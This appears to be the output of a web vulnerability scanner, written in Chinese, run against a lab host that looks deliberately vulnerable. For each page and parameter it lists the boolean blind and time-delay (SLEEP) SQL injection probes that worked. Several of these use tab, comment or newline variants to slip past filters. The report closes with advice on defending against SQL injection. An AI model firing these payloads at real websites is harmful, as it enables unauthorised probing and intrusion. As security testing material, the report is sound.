目标：http://192.168.42.133 (GET)

---
URL:http://192.168.42.133/sqli/example6.php (GET)
漏洞名称: blind sqli
Query: {'id': '2'}
Payload: '+and+'16378'='16378
'+and+'1809'='1809
'+or+77377=77377#
'+and+'50320'='50321
---

---
URL:http://192.168.42.133/sqli/example1.php (GET)
漏洞名称: blind sqli
Query: {'name': 'root'}
Payload: '	and	'32489'='32489
'	and	'38671'='38671
'	or	63278=63278#
'	and	'93184'='93185
---

---
URL:http://192.168.42.133/sqli/example2.php (GET)
漏洞名称: blind sqli
Query: {'name': 'root'}
Payload: '	and	'32489'='32489
'	and	'38671'='38671
'	or	63278=63278#
'	and	'93184'='93185
---

---
URL:http://192.168.42.133/sqli/example4.php (GET)
漏洞名称: blind sqli
Query: {'id': '2'}
Payload: 	and	74764=74764
	and	73169=73169
	or	84068=84068#
	and	41488=41489
---

---
URL:http://192.168.42.133/sqli/example5.php (GET)
漏洞名称: blind sqli
Query: {'id': '2'}
Payload: 	and	74764=74764
	and	73169=73169
	or	84068=84068#
	and	41488=41489
---

---
URL:http://192.168.42.133/sqli/example3.php (GET)
漏洞名称: blind sqli
Query: {'name': 'root'}
Payload: '/**/and/**/'49480'='49480
'/**/and/**/'66380'='66380
'/**/or/**/90018=90018#
'/**/and/**/'91997'='91998
---

---
URL:http://192.168.42.133/sqli/example7.php (GET)
漏洞名称: blind sqli
Query: {'id': '2'}
Payload: 
and
47134=47134

and
7562=7562

or
40954=40954#

and
41=42
---

---
URL:http://192.168.42.133/xml/example2.php (GET)
漏洞名称: blind sqli
Query: {'name': 'hacker'}
Payload: '+and+'16378'='16378
'+and+'1809'='1809
'+or+77377=77377#
'+and+'50320'='50321
---

---
URL:http://192.168.42.133/sqli/example8.php (GET)
漏洞名称: time delay sqli vuln
Query: {'order': 'name'}
Payload: ` or SLEEP(3);-- 
---

---
URL:http://192.168.42.133/sqli/example9.php (GET)
漏洞名称: time delay sqli vuln
Query: {'order': 'name'}
Payload:  or SLEEP(3);-- 
---

    防御SQL注入漏洞的建议：

    [1] 库或框架

        使用能够防御SQL注入漏洞的库或框架。

    [2] 参数化

        尽量使用自动实施数据和代码之间的分离的结构化机制。
        这些机制也能够自动提供相关引用、编码和验证，而不是依赖于开发者在生成输出的每一处提供此能力。

    [3] 环境固化

        使用完成必要任务所需的最低特权来运行代码。

    [4] 输出编码

        如果在有风险的情况下仍需要使用动态生成的查询字符串或命令，请对参数正确地加引号并将这些参数中的任何特殊字符转义。

    [5] 输入验证

        假定所有输入都是恶意的。
        使用“接受已知善意”输入验证策略：严格遵守规范的可接受输入的白名单。
        拒绝任何没有严格遵守规范的输入，或者将其转换为遵守规范的内容。
        不要完全依赖于通过黑名单检测恶意或格式错误的输入。但是，黑名单可帮助检测潜在攻击，或者确定哪些输入格式不正确，以致应当将其彻底拒绝。

    